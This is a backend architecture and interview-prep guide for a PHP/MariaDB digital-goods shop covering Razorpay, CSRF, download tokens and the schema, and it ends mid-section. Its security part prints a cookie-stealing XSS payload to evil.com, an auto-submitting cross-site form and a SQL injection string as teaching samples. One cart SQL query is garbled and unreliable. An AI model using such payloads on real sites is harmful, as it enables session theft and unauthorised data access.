# UX Pacific Shop — Complete Backend Guide
**For: Learning, Interviews, and Portfolio Explanation**
**Language: PHP 8.2 | Database: MariaDB | Payment: Razorpay | Storage: Cloudflare R2**

---

## TABLE OF CONTENTS

1. [What Is This Project?](#1-what-is-this-project)
2. [How the Code Is Organized](#2-how-the-code-is-organized)
3. [How a Request Travels Through the App](#3-how-a-request-travels-through-the-app)
4. [config.php — The Foundation](#4-configphp--the-foundation)
5. [_bootstrap.php — API Middleware](#5-_bootstrapphp--api-middleware)
6. [helpers.php — Shared Utilities](#6-helpersphp--shared-utilities)
7. [The Cart System](#7-the-cart-system)
8. [The Order System](#8-the-order-system)
9. [The Payment System (Razorpay)](#9-the-payment-system-razorpay)
10. [OrderFulfillmentService — The Pipeline](#10-orderfulfillmentservice--the-pipeline)
11. [DigitalDownloadService — File Delivery](#11-digitaldownloadservice--file-delivery)
12. [The Email System](#12-the-email-system)
13. [Security — Every Layer Explained](#13-security--every-layer-explained)
14. [Database Design](#14-database-design)
15. [Performance Tricks You Used](#15-performance-tricks-you-used)
16. [Interview Q&A — Real Questions, Real Answers](#16-interview-qa--real-questions-real-answers)
17. [Glossary — Terms You Must Know](#17-glossary--terms-you-must-know)

---

## 1. What Is This Project?

An **e-commerce platform for digital design resources** — UI templates, Figma files, mockups, Canva templates.

Customers can:
- Browse and search products and bundles
- Add to cart, checkout, pay online via Razorpay
- Download paid files immediately after payment
- Track their orders and re-download within expiry limits

The system also handles:
- Free product claims (1 per account, lifetime)
- Admin dashboard to manage products, orders, resources
- 15 automated email types (welcome, order, password reset, etc.)
- Encrypted file storage on Cloudflare R2 (cloud) or local disk

**Why it matters technically:** This isn't a tutorial. It handles real money, concurrent users, digital rights, and production security.

---

## 2. How the Code Is Organized

```
UX_Shop_New/
│
├── api/                        ← All REST API endpoints (HTTP layer)
│   ├── _bootstrap.php          ← Shared setup for EVERY API file
│   ├── cart/
│   │   ├── add.php             ← POST: add item to cart
│   │   ├── list.php            ← GET: get user's cart
│   │   ├── update.php          ← POST: change quantity
│   │   └── remove.php          ← POST: remove item
│   ├── order/
│   │   ├── create.php          ← POST: place an order
│   │   ├── get.php             ← GET: fetch order details
│   │   └── downloads.php       ← GET: get download tokens for order
│   ├── payment/
│   │   ├── razorpay-create-order.php  ← POST: create Razorpay order
│   │   ├── razorpay-verify.php        ← POST: verify payment + fulfill
│   │   └── webhook.php                ← POST: Razorpay webhook handler
│   ├── download/
│   │   └── file.php            ← GET: serve/redirect to file (token-gated)
│   ├── auth/
│   │   ├── login.php
│   │   └── signup.php
│   └── admin/                  ← Admin-only endpoints
│
├── includes/                   ← Business logic (Service layer)
│   ├── config.php              ← DB, session, headers, CSRF setup
│   ├── helpers.php             ← Utility functions + email templates
│   ├── EmailService.php        ← All 15 email types
│   ├── OrderFulfillmentService.php   ← Post-payment pipeline
│   ├── DigitalDownloadService.php    ← Token generation + file serving
│   ├── DigitalStorageService.php     ← Cloud/local storage abstraction
│   ├── OrderPaymentService.php       ← Razorpay payment capture
│   ├── InventoryReservationService.php ← Stock reservation
│   └── RazorpayClient.php      ← Razorpay API wrapper
│
├── core/
│   ├── Mailer.php              ← PHPMailer SMTP wrapper
│   └── env.php                 ← .env file loader
│
├── admin/                      ← Admin dashboard UI
├── migrations/                 ← Numbered SQL schema files
├── storage/private/            ← Encrypted files (NOT web-accessible)
├── .env                        ← Secrets (DB password, API keys)
├── .env.example                ← Template showing which keys are needed
├── .htaccess                   ← Apache security + performance rules
├── script.js                   ← Customer JavaScript
└── style.css                   ← Customer styles
```

### The Two Key Patterns

**Pattern 1: Thin API, Fat Service**
```
api/payment/razorpay-verify.php     ← THIN: just receives and validates request
  → OrderPaymentService::capture()  ← FAT: all the real business logic lives here
  → OrderFulfillmentService::fulfillPaidOrder()
  → EmailService::sendOrderConfirmation()
```
Every API file is thin. It reads input, calls a service, sends back JSON. That's it.

**Pattern 2: Environment-based config**
```
.env file → core/env.php loads it → getenv('KEY') reads it anywhere
```
No secret is ever hardcoded. Change `.env` to switch environments.

---

## 3. How a Request Travels Through the App

Let's follow a customer clicking "Add to Cart":

```
BROWSER                          SERVER
  │                                │
  ├── POST /api/cart/add.php ──────►│
  │   Body: { product_id: 5,       │
  │           quantity: 1,         │
  │           csrf_token: "abc" }  │
  │                                │
  │                          api/cart/add.php
  │                                │── require _bootstrap.php
  │                                │     ├── require includes/config.php
  │                                │     │     ├── load .env
  │                                │     │     ├── set security headers
  │                                │     │     ├── start session
  │                                │     │     └── connect to database ($conn)
  │                                │     └── define helper functions
  │                                │
  │                                │── apiRequirePost()    → 405 if not POST
  │                                │── apiRequireUser()    → 401 if not logged in
  │                                │── apiInput()          → parse JSON body
  │                                │── validateCsrf()      → 403 if bad token
  │                                │
  │                                │── validate product exists in DB
  │                                │── check if already in cart
  │                                │── INSERT or UPDATE cart row
  │                                │
  │◄─── { status:"success",        │
  │       message:"Item added",    │
  │       data: {cart_id: 42} } ───┤
```

Every API call goes through this same flow. The only difference is the business logic in the middle.

---

## 4. config.php — The Foundation

**File:** `includes/config.php`
**Loaded by:** every single page and API through `_bootstrap.php`

This file runs FIRST before any business logic. Here is what it does, step by step:

### Step 0: Output Buffer
```php
if (ob_get_level() === 0) {
    ob_start();
}
```
Catches accidental output (a blank line before `<?php`, a BOM character) so HTTP headers can still be sent. Without this, sending a header after any output causes a fatal error.

### Step 1: Load Environment Variables
```php
require_once __DIR__ . '/env.php';
```
Reads your `.env` file. After this, `getenv('DB_HOST')` works everywhere.

### Step 2: Error Reporting
```php
$app_debug = (env('APP_DEBUG', 'false') === 'true');
ini_set('display_errors', $app_debug ? '1' : '0');
ini_set('error_log', $logDir . '/app_errors.log');
```
- In development: errors shown on screen
- In production: errors written to `logs/app_errors.log`, never shown to users
- **Why:** Never expose error details (stack traces, DB structure) to users — attackers read them

### Step 3: Security Headers
```php
header('X-Frame-Options: SAMEORIGIN');         // blocks clickjacking
header('X-Content-Type-Options: nosniff');     // blocks MIME sniffing
header('X-XSS-Protection: 1; mode=block');    // legacy XSS filter
header('Referrer-Policy: strict-origin-when-cross-origin');
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://checkout.razorpay.com ...");
header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
```

These are sent as HTTP response headers. The browser reads them and enforces them.

| Header | What it prevents |
|---|---|
| X-Frame-Options | Your page being embedded in an iframe on evil.com |
| X-Content-Type-Options | Browser treating a .jpg as JavaScript |
| CSP | Inline scripts/styles from domains you didn't whitelist |
| HSTS | HTTP downgrade attacks (forces HTTPS) |

### Step 4: Session Setup
```php
session_set_cookie_params([
    'lifetime' => 86400,    // 24 hours
    'httponly' => true,     // JS cannot read the cookie
    'samesite' => 'Lax',   // cookie not sent from external POST
    'secure'   => $isHttps, // cookie only over HTTPS
]);
session_start();
```
Sessions are stored in `storage/sessions/` (not in the system temp folder — more secure, easier to manage).

### Step 5: Database Connection
```php
$conn = new mysqli(
    env('DB_HOST', 'localhost'),
    env('DB_USER', 'root'),
    env('DB_PASS', ''),
    env('DB_NAME', 'uxmerchandise')
);
$conn->set_charset("utf8mb4");
```
Uses MySQLi with `utf8mb4` — supports all characters including emoji.
If connection fails, returns JSON `{"status":"error","message":"Database connection error"}` and exits.

### Step 6: CSRF Token
```php
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
```
Generates a 64-character random hex token and stores it in the session. Every page includes this in a `<meta>` tag. Every POST request must send it back.

---

## 5. _bootstrap.php — API Middleware

**File:** `api/_bootstrap.php`
**Purpose:** Every API file starts with `require_once __DIR__ . '/../_bootstrap.php';`

It loads `config.php` and then defines helper functions that all API files use:

### `apiUser()` — who is logged in?
```php
function apiUser(): ?array {
    if (empty($_SESSION['user_id'])) return null;
    return [
        'id'        => (int) $_SESSION['user_id'],
        'email'     => $_SESSION['user_email'] ?? '',
        'firstName' => $_SESSION['first_name'] ?? '',
        'role'      => $_SESSION['user_role'] ?? 'customer',
    ];
}
```
Reads session data. Returns `null` if not logged in.

### `apiRequireUser()` — enforce login
```php
function apiRequireUser(): array {
    $user = apiUser();
    if (!$user) {
        sendResponse('error', 'Please sign in first.', null, 401);
    }
    return $user;
}
```
If not logged in, immediately sends a 401 response and exits. API files use this at the top.

### `apiRequirePost()` — enforce HTTP method
```php
function apiRequirePost(): void {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        sendResponse('error', 'Method not allowed.', null, 405);
    }
}
```

### `apiInput()` — read JSON body
```php
function apiInput(): array {
    return apiReadJsonBody(); // reads php://input once, caches it
}
```
Reads the raw JSON body. `php://input` can only be read once, so it's cached.

### `apiProductPayload()` — standardize product data
```php
function apiProductPayload(array $row): array {
    $isFree = !empty($row['is_free']) || (float)($row['price'] ?? 0) <= 0;
    return [
        'id'             => (string) $row['id'],
        'name'           => $row['name'],
        'is_free'        => $isFree,
        'price'          => $isFree ? 0.0 : (float) $row['price'],
        'available_type' => $row['available_type'] ?? 'physical',
        // ...
    ];
}
```
Ensures every product in every API response looks the same. The frontend can rely on this shape.

---

## 6. helpers.php — Shared Utilities

**File:** `includes/helpers.php`
**Loaded by:** config.php, so available everywhere

### `sendResponse()` — the universal JSON response
```php
function sendResponse($status, $message, $data = null, $code = 200) {
    http_response_code($code);
    header('Content-Type: application/json');
    echo json_encode(['status' => $status, 'message' => $message, 'data' => $data]);
    exit;
}
```
Every API response calls this. `exit` stops execution immediately after sending.

Usage:
```php
sendResponse('success', 'Item added to cart.', ['cart_id' => 42]);
sendResponse('error', 'Product not found.', null, 404);
```

### `flushJsonResponse()` — respond then keep working
```php
function flushJsonResponse($status, $message, $data = null, $code = 200): void {
    // Send the JSON response...
    header('Content-Length: ' . strlen($json));
    header('Connection: close');
    echo $json;
    
    // Release the HTTP connection (browser sees response as complete)
    if (function_exists('fastcgi_finish_request')) {
        fastcgi_finish_request();
    } else {
        while (ob_get_level() > 0) ob_end_flush();
        flush();
    }
    
    ignore_user_abort(true);
    // PHP keeps running here — used to send emails after checkout
}
```
The browser sees the response as complete and the checkout page loads. Meanwhile PHP keeps running to send emails. This is how checkout feels instant even though SMTP is slow.

### `validateCsrf()` — check CSRF token
```php
function validateCsrf() {
    $headerToken = $_SERVER['HTTP_X_CSRF_TOKEN'] ?? '';
    $bodyToken   = apiReadJsonBody()['csrf_token'] ?? '';
    $token = $headerToken ?: $bodyToken;
    
    if (!hash_equals($_SESSION['csrf_token'], $token)) {
        sendResponse('error', 'Invalid CSRF token', null, 403);
    }
}
```
Uses `hash_equals()` — a timing-safe comparison. A normal `===` comparison can leak token length through timing differences (a side-channel attack).

### `requireAdmin()` — admin-only guard
```php
function requireAdmin() {
    if (empty($_SESSION['admin_id'])) {
        sendResponse('error', 'Unauthorized: Admin access required', null, 401);
    }
}
```

---

## 7. The Cart System

### Data Structure (DB Table: `cart`)

```sql
cart (
    id              INT PRIMARY KEY,
    user_id         INT,                               -- who owns this cart row
    item_type       ENUM('product','bundle','freebie'),-- discriminator column
    product_id      INT NULL,                          -- set for product/freebie
    bundle_id       INT NULL,                          -- set for bundle
    selected_format ENUM('digital','physical'),
    quantity        INT,
    size            VARCHAR(50) NULL,
    available_type  VARCHAR(50),
    created_at      DATETIME
)
```

**Why this design?** The old design put bundles into the `products` table as "proxy products." This caused ID collisions and corrupted order data. The typed cart uses proper foreign keys and an `item_type` column to know which table to join.

### Adding to Cart (`api/cart/add.php`)

```
STEP 1: Require POST, login, valid CSRF
STEP 2: Normalize item_type (product/bundle/freebie)
STEP 3: Validate the item exists in DB and is active
STEP 4: Determine selected_format (digital/physical)
STEP 5: If free item — cap qty to 1, check if already claimed
STEP 6: Look for existing cart row (same user+type+id+format+size)
STEP 7a: If exists → UPDATE quantity (capped at 10)
STEP 7b: If not exists → INSERT new row
STEP 8: Return { status: "success", data: { cart_id: ... } }
```

**Key business rule — free items are one per account, lifetime:**
```php
function apiUserAlreadyOwnsFreeItem(mysqli $conn, int $userId, int $productId): bool {
    $stmt = $conn->prepare(
        'SELECT 1 FROM order_items oi
         JOIN orders o ON o.id = oi.order_id
         WHERE o.user_id = ?
           AND oi.product_id = ?
           AND oi.price = 0
           AND o.status NOT IN ("cancelled", "failed", "refunded")
         LIMIT 1'
    );
    // ...
}
```

### Getting Cart (`api/cart/list.php`)

Uses a single SQL query with `LEFT JOIN` to both `products` and `bundles`, using `COALESCE` to pick the right name and price:

```sql
SELECT c.*,
    COALESCE(p.name, b.
    0, f.name)   AS name,
    COALESCE(p.price, b.price, 0)      AS price,
    COALESCE(p.image, b.image, f.image) AS image
FROM cart c
LEFT JOIN products p ON p.id = c.product_id AND c.item_type = 'product'
LEFT JOIN bundles  b ON b.id = c.bundle_id  AND c.item_type = 'bundle'
LEFT JOIN freebies f ON f.id = c.product_id AND c.item_type = 'freebie'
WHERE c.user_id = ?
```

One query, all item types. No N+1 problem.

---

## 8. The Order System

### Order Lifecycle (States)

```
awaiting_payment  →  paid        →  processing
                                  →  shipped
                                  →  delivered
                  →  failed
                  →  cancelled
                  →  refunded
```

### Creating an Order (`api/order/create.php`)

This is the most complex API. It runs inside a database transaction.

```
STEP 1: Validate input (items array, payment method)
STEP 2: BEGIN TRANSACTION
STEP 3: For each cart item:
    a. SELECT the product/bundle/freebie FOR UPDATE
       (locks the row — prevents race conditions on stock)
    b. Validate item is active and in stock
    c. Determine format (digital/physical)
    d. UPDATE stock (decrease) / UPDATE sales_count (increase)
    e. Check free item duplication rule
    f. Calculate price × quantity
STEP 4: Calculate totals
    subtotal = sum of (price × qty)
    tax      = subtotal × 0.18   (18% GST)
    shipping = ₹50 if hasPhysical, else ₹0
    total    = subtotal + tax + shipping
STEP 5: Determine initial status
    Free order  → status='paid', payment_status='paid' (bypass payment)
    Razorpay    → status='awaiting_payment', payment_status='pending'
STEP 6: INSERT into orders table
STEP 7: INSERT into order_items (one row per cart item)
STEP 8: Create inventory reservations for physical items
STEP 9: Clear cart items
STEP 10: COMMIT
STEP 11: If free order → trigger fulfillment immediately
STEP 12: Return order details to frontend
```

**Why `FOR UPDATE` on the product row?**

Without it, two customers could both check stock = 1, both think there's enough, and both place orders. With `FOR UPDATE`, MySQL locks the row until the transaction commits, so the second customer waits and sees the updated stock.

**Order Number format:**
```php
$orderNumber = 'UXP-' . date('Ymd') . '-' . strtoupper(substr(bin2hex(random_bytes(3)), 0, 6));
// Example: UXP-20260618-A3F9C2
```

---

## 9. The Payment System (Razorpay)

### Step 1: Create Razorpay Order

**File:** `api/payment/razorpay-create-order.php`

```
Frontend asks: "I want to pay for order #42"
Server:
  1. Validates the internal order exists and belongs to this user
  2. Calls Razorpay API: POST /v1/orders
     { amount: 89900, currency: "INR", receipt: "UXP-20260618-A3F9C2" }
     (amount is in paise — ₹899 = 89900 paise)
  3. Razorpay returns: { id: "order_XYZ123", amount: 89900, ... }
  4. Server returns Razorpay order_id to frontend
```

### Step 2: Collect Payment (Frontend)

```javascript
const rzp = new Razorpay({
    key: RAZORPAY_KEY_ID,
    order_id: rzpOrderId,        // from Step 1
    amount: totalInPaise,
    currency: 'INR',
    handler: function(response) {
        // User paid — now verify on server
        verifyPayment(response.razorpay_payment_id,
                      response.razorpay_order_id,
                      response.razorpay_signature);
    }
});
rzp.open();
```

Razorpay opens a payment modal. The customer enters card/UPI details. Razorpay processes the payment. If successful, it calls `handler` with three values.

### Step 3: Verify Payment (`api/payment/razorpay-verify.php`)

This is the most security-critical file in the project:

```
RECEIVE: razorpay_order_id, razorpay_payment_id, razorpay_signature, internal order_id

STEP 1: Require POST, login, valid CSRF
STEP 2: Validate field formats (regex — prevents injection)
STEP 3: Verify HMAC-SHA256 signature
    expected = HMAC_SHA256(
        key    = RAZORPAY_KEY_SECRET,
        data   = razorpay_order_id + "|" + razorpay_payment_id
    )
    if expected !== razorpay_signature → reject (tampering detected)

STEP 4: Fetch actual amount from Razorpay API
    (can't trust the amount the browser sends — it could be modified)

STEP 5: Record payment in DB
    UPDATE orders SET
        payment_status = 'paid',
        razorpay_payment_id = ...,
        paid_at = NOW()
    WHERE id = ? AND user_id = ?

STEP 6: Fulfill order (downloads + inventory)
STEP 7: flushJsonResponse() — send response to browser
STEP 8: Send emails (after response flushed)
```

**Why fetch amount from Razorpay API?**
A customer could modify the `amount` field in JavaScript before verifying. If we trusted the amount from the browser, they'd pay ₹1 for a ₹999 product. By fetching from Razorpay, we use the amount Razorpay actually charged — the source of truth.

### Step 4: Webhook (`api/payment/webhook.php`)

Razorpay calls this URL directly from their servers when payments succeed or fail.

```
USE CASE: Customer pays → browser crashes before verify can run
  WITHOUT webhook: Order stuck at awaiting_payment forever
  WITH webhook:    Razorpay calls our server → fulfillment happens anyway

WEBHOOK VALIDATION:
  X-Razorpay-Signature = HMAC_SHA256(webhook_secret, raw_body)
  If this doesn't match → reject (not from Razorpay)
```

Both verify and webhook call the same `OrderFulfillmentService::fulfillPaidOrder()` — which is **idempotent** (safe to call twice without duplication).

---

## 10. OrderFulfillmentService — The Pipeline

**File:** `includes/OrderFulfillmentService.php`

This service runs after a payment is confirmed. It connects all the pieces.

```
fulfillPaidOrder(orderId, conn, deferEmails)
    │
    ├── fulfillPaidOrderCore()           ← runs in a DB transaction
    │   ├── BEGIN TRANSACTION
    │   ├── SELECT order FOR UPDATE      ← lock order row
    │   ├── verify payment_status = 'paid'
    │   ├── InventoryReservationService::consumeOrder()
    │   │   └── mark physical stock reservations as consumed
    │   ├── DigitalDownloadService::generateDownloadsForOrder()
    │   │   └── INSERT download tokens for each digital item
    │   └── COMMIT
    │
    └── sendFulfillmentEmails()          ← runs after transaction
        ├── EmailService::sendOrderConfirmation()
        ├── EmailService::sendInvoice()
        └── notifyAdminOnce()
            └── EmailService::notifyAdminNewOrder()
```

### Idempotency — Why It Matters

Both `razorpay-verify.php` and `webhook.php` call this service. In a race condition they might call it at the same time.

**Without idempotency:** customer gets 2 emails, 2 sets of download tokens.

**How idempotency is implemented:**

For download tokens:
```sql
INSERT IGNORE INTO digital_downloads (...) VALUES (...)
```
`INSERT IGNORE` silently skips if the row already exists.

For emails:
```php
// notifyAdminOnce() checks:
SELECT admin_notified_at FROM orders WHERE id = ?
// If not NULL → skip sending
// If NULL → send email, then:
UPDATE orders SET admin_notified_at = NOW() WHERE id = ?
```

For inventory:
```sql
-- InventoryReservationService checks consumed_at before acting
SELECT consumed_at FROM inventory_reservations WHERE order_id = ?
-- Only consumes if consumed_at IS NULL
```

### `deferEmails` Parameter

In `razorpay-verify.php`:
```php
OrderFulfillmentService::fulfillPaidOrder($orderId, $conn, deferEmails: true);
// → runs DB work only (fast)

flushJsonResponse('success', ...);
// → browser gets response, checkout shows as complete

OrderFulfillmentService::sendFulfillmentEmails($orderId, $conn);
// → sends emails (slow SMTP), customer doesn't wait for this
```

Without this, the customer would stare at a spinner for 3-5 seconds while SMTP connects.

---

## 11. DigitalDownloadService — File Delivery

**File:** `includes/DigitalDownloadService.php`

Handles everything about getting digital files to customers.

### Token Generation

When an order is fulfilled:
```php
$token = bin2hex(random_bytes(32)); // 64-character random hex string
// Example: a3f9c2b1e4d7a8f2c3b0e1d4a5f6c7b8a9d0e1f2c3b4a5d6e7f8c9b0a1d2e3f4

INSERT INTO digital_downloads (
    order_id, order_item_id, resource_id, user_id,
    token,          -- the unguessable token
    download_limit, -- e.g. 5
    expires_at,     -- e.g. NOW() + 30 days
    file_path       -- path or storage key
) VALUES (...)
```

`random_bytes(32)` uses the OS's cryptographically secure random number generator. With 256 bits of entropy, brute-forcing is impossible.

### Building a Download URL

```php
public static function buildDownloadUrl(string $token, int $userId): string {
    $exp = time() + self::accessTtlSeconds();  // 10 minutes from now
    $sig = hash_hmac('sha256', $token . '|' . $userId . '|' . $exp, $signingKey);
    
    return 'api/download/file.php?token=' . $token . '&exp=' . $exp . '&sig=' . $sig;
}
```

The URL contains:
- `token` — identifies which download record
- `exp` — unix timestamp when it expires
- `sig` — HMAC signature proving these values weren't tampered with

### Serving a File (`validateAndServe()`)

Every download request passes through 7 checks:

```
CHECK 1: Does this token exist in digital_downloads?
CHECK 2: Does user_id match? (you can't use someone else's token)
CHECK 3: Is the resource still active?
CHECK 4: Is the order payment_status = 'paid'?
CHECK 5: Is expires_at in the future?
CHECK 6: Is download_count < download_limit?
PASS ALL CHECKS:
    UPDATE digital_downloads SET download_count = download_count + 1
    (inside a transaction with FOR UPDATE — prevents race on download count)
    
SERVE FILE:
    Mode 'open_link'    → 302 redirect to external URL
    Mode 'instructions' → render HTML page with instructions
    Mode 'download':
        If storage_key set → DigitalStorageService::getSignedUrl() → redirect to R2
        If file_path set   → readfile() from local disk
```

### Why Transactions on Download Count?

If two requests hit simultaneously:
- Without transaction: both read count=4, both pass check 6 (limit=5), both increment → count becomes 5 but 2 downloads served past limit
- With `FOR UPDATE`: second request waits, reads count=5, fails check 6 → exactly 5 downloads served

---

## 12. The Email System

**File:** `includes/EmailService.php` + `includes/helpers.php` + `core/Mailer.php`

### How Emails Are Sent

```
EmailService::sendOrderConfirmation($orderId, $conn)
    │
    ├── Query DB for order + items + user
    ├── Build HTML using buildEmailLayout() helper
    │   └── Inlined CSS, preheader text, header, content, footer
    ├── new Mailer()
    │   └── new PHPMailer()
    │       ├── SMTP host from getenv('SMTP_HOST')
    │       ├── Port from getenv('SMTP_PORT')
    │       ├── Auth from getenv('SMTP_USER'), getenv('SMTP_PASS')
    │       └── send()
    └── return true/false
```

### Email Template Pattern

All 15 emails use the same layout function:

```php
function buildEmailLayout($title, $preheader, $contentHtml) {
    // Returns a full HTML email with:
    // - Dark header with "UX Pacific Shop" and the title
    // - Content area with your $contentHtml
    // - Footer with support email
    // All styling is INLINE CSS (Gmail strips <style> tags)
}
```

Usage:
```php
$content = "<p>Hello {$name},</p><p>Your order is ready.</p><table>...</table>";
$html    = buildEmailLayout('Order Confirmation', 'Your downloads are ready', $content);
$mailer->send($email, 'Order Confirmation — UX Pacific', $html);
```

### 15 Email Types

| # | Trigger | Template |
|---|---|---|
| 1 | User signup | Welcome email |
| 2 | Forgot password | Reset link (1 hour expiry) |
| 3 | Order paid | Order confirmation + download link |
| 4 | Order paid | Invoice (separate formal receipt) |
| 5 | Free order | Free product confirmation |
| 6 | Payment failed | "Try again" notification |
| 7 | Admin: new order | "[New Order] #UXP-..." |
| 8 | Admin: payment failed | "[Payment Failed] #UXP-..." |
| 9 | Order shipped | Shipping notification |
| 10 | Order delivered | Delivery confirmation |
| 11 | Order cancelled | Cancellation notice |
| 12 | Refund processed | Refund confirmation |
| 13 | Contact form | Admin gets the message |
| 14 | Contact form | Customer gets auto-reply |
| 15 | COD order | COD confirmation |

### Why SMTP Crashes Are Caught

```php
try {
    EmailService::sendOrderConfirmation($orderId, $conn);
} catch (Throwable $e) {
    error_log('confirmation email failed: ' . $e->getMessage());
    // Order was already fulfilled — just log the email failure
}
```

Email failure must never cancel a completed payment. The customer paid — they get their files regardless of whether the email sends.

---

## 13. Security — Every Layer Explained

### Layer 1: CSRF Protection

**What it attacks:** Evil website tricks your logged-in browser into making a request to your site.

```
How it works without CSRF protection:
  1. You're logged in to uxpacific.com (session cookie exists)
  2. You visit evil.com
  3. evil.com has a hidden form:
     <form action="https://uxpacific.com/api/cart/add.php" method="POST">
       <input name="product_id" value="1">
     </form>
     <script>document.forms[0].submit()</script>
  4. Your browser sends the request WITH your session cookie
  5. Your cart gets modified without your knowledge

With CSRF protection:
  5. The request has no X-CSRF-TOKEN header (evil.com can't read it)
  6. Server rejects with 403
```

**Implementation:**
```php
// Session stores a random token
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// Every HTML page puts it in a meta tag
<meta name="csrf-token" content="<?= $_SESSION['csrf_token'] ?>">

// JS reads it and sends it with every POST
fetch(url, {
    headers: { 'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content }
})

// Server validates with timing-safe comparison
if (!hash_equals($_SESSION['csrf_token'], $receivedToken)) {
    // reject
}
```

**Why `hash_equals`?** A normal `===` comparison is faster when strings differ early. An attacker measuring response times could guess token characters one by one. `hash_equals` always takes the same time regardless.

### Layer 2: SQL Injection Prevention

**What it attacks:** Injecting SQL code through user input fields.

```php
// VULNERABLE — never do this:
$email = $_POST['email'];
$query = "SELECT * FROM users WHERE email = '$email'";
// Attacker enters: admin@x.com' OR '1'='1' --
// Query becomes: SELECT * FROM users WHERE email = 'admin@x.com' OR '1'='1' --'
// Returns all users!

// SECURE — what you do:
$stmt = $conn->prepare("SELECT * FROM users WHERE email = ?");
$stmt->bind_param('s', $email);
$stmt->execute();
// The ? is a placeholder — the value is sent separately, never interpreted as SQL
```

Every single database query in this project uses prepared statements.

### Layer 3: XSS Prevention

**What it attacks:** Injecting `<script>` tags through user input that other users' browsers execute.

```php
// VULNERABLE:
echo $user['bio']; // if bio = <script>document.location='evil.com?c='+document.cookie</script>
                   // everyone who views this page sends their cookie to evil.com

// SECURE:
echo htmlspecialchars($user['bio'], ENT_QUOTES, 'UTF-8');
// Outputs: &lt;script&gt;... (browser shows it as text, doesn't execute it)
```

Every user-supplied value that goes into HTML output is escaped.

### Layer 4: Password Security

```php
// Signup:
$hash = password_hash($password, PASSWORD_DEFAULT);
// Stores: $2y$10$... (bcrypt with automatic random salt)

// Login:
if (password_verify($inputPassword, $storedHash)) {
    // correct
}
```

**Why bcrypt?** It's intentionally slow. Hashing one password takes ~100ms. If the DB is breached, an attacker must spend 100ms per guess. A dictionary of 1 billion common passwords would take 100 million seconds (~3 years) to crack on modern hardware.

**Why salts?** Each bcrypt hash includes a random salt, so two users with the same password have different hashes. Pre-computed "rainbow table" attacks don't work.

### Layer 5: Open Redirect Prevention

**What it attacks:** Using your site as a redirect bridge to trick users.

```
Attacker sends link: https://uxpacific.com/signin.php?redirect=https://evil.com
User trusts uxpacific.com → clicks → logs in → lands on evil.com
```

**Prevention (in signin.php):**
```javascript
const SAFE_REDIRECT_PATHS = ['checkout.php', 'cart.php', 'orders.php', 'account.php'];

function getSafeRedirect(rawParam) {
    if (!rawParam) return 'index.php';
    let decoded = decodeURIComponent(rawParam);
    
    // Block external URLs (including protocol-relative: //evil.com)
    if (decoded.startsWith('//') || /^https?:/i.test(decoded)) return 'index.php';
    // Block path traversal: ../admin/
    if (decoded.includes('..')) return 'index.php';
    
    // Exact match against allowlist only
    const path = decoded.split('?')[0];
    return SAFE_REDIRECT_PATHS.includes(path) ? decoded : 'index.php';
}
```

### Layer 6: File Access Control

Files in `storage/private/` are blocked at the Apache level:
```apache
# .htaccess in storage/private/
Require all denied
```
Even if someone guesses the file path, the web server returns 403. The only way to access a file is through `api/download/file.php` which checks all 7 layers.

### Layer 7: Content Security Policy

The CSP header tells the browser which sources are allowed:
```
default-src 'self'                 → nothing from external domains by default
script-src 'self' https://checkout.razorpay.com  → scripts only from us + Razorpay
connect-src 'self' https://api.razorpay.com      → AJAX only to us + Razorpay API
```

If a stored XSS somehow got through, the browser would block the injected script from loading.

---

## 14. Database Design

### Key Tables

```
users
  id, email, password_hash, first_name, last_name, role, created_at

products
  id, name, description, price, old_price, category, image,
  stock, sales_count, available_type, is_free, is_active,
  digital_file_path, download_limit, download_expiry_days

bundles
  id, name, description, price, image, is_active, digital_file_path

freebies
  id, name, description, category, image, file_url, download_count, is_active

cart
  id, user_id, item_type, product_id, bundle_id, quantity,
  selected_format, size, available_type, created_at

orders
  id, order_number, user_id, total, subtotal, shipping, tax,
  payment_method, status, payment_status,
  razorpay_payment_id, razorpay_order_id,
  paid_at, shipping_address,
  confirmation_email_sent_at, invoice_email_sent_at, admin_notified_at

order_items
  id, order_id, product_id, bundle_id, quantity, price, size,
  product_name, product_image, item_type, selected_format

digital_resources
  id, product_id, bundle_id, freebie_id, title, resource_type,
  storage_key, file_path, external_url, instructions,
  delivery_mode, download_limit, expiry_days, is_active, sort_order

digital_downloads
  id, order_id, order_item_id, resource_id, user_id, product_id,
  token, download_count, download_limit, expires_at, file_path, item_name

inventory_reservations
  id, order_id, order_item_id, item_type, item_id, quantity,
  reserved_at, consumed_at, released_at

password_resets
  id, user_id, email, token_hash, expires_at, used_at
```

### Relationships Diagram

```
users ──────────────────────────── orders
                                     │
products ───── digital_resources     │
bundles  ───── digital_resources   order_items
freebies ───── digital_resources     │
                                   digital_downloads
                                   inventory_reservations
```

### Migration Strategy

Numbered SQL files in `migrations/`:
```
001_admin_improvements.sql
002_production_schema_alignment.sql
003_digital_products.sql
004_unified_cart_digital_resources_and_fulfillment.sql
005_order_email_tracking_columns.sql
```

Run them in order. Any new developer can recreate the full schema by running all files. No manual steps. No "I remember adding a column last week."

### Why `is_active` Instead of Deleting?

Orders reference products by `product_id`. If you delete a product, old orders lose their reference. Instead, set `is_active = 0` — the product is hidden from the shop but order history is preserved.

---

## 15. Performance Tricks You Used

### 1. Output Buffering (`ob_start()`)
Starts at the top of config.php. All output is buffered — headers can be sent at any point. Without this, a stray space before `<?php` would prevent headers from being sent.

### 2. `flushJsonResponse()` for Slow Operations
Used in checkout and verify. Releases the HTTP connection before doing SMTP. Customer sees success immediately.

### 3. Cart Deduplication in JavaScript
```javascript
// Prevent 12 API calls firing at once on page load
let inFlightCartFetch = null;
function fetchCart() {
    if (inFlightCartFetch) return inFlightCartFetch;
    inFlightCartFetch = fetch('/api/cart/list.php')
        .finally(() => { inFlightCartFetch = null; });
    return inFlightCartFetch;
}
```
One API call per page load instead of 12.

### 4. Database Indexes
Critical columns are indexed:
- `users.email` — login lookup
- `orders.user_id` — fetch user's orders
- `orders.status`, `orders.payment_status` — admin filtering
- `digital_downloads.token` — every download validates by token
- `cart.user_id` — cart fetch

### 5. GZIP Compression in `.htaccess`
```apache
<IfModule mod_deflate.c>
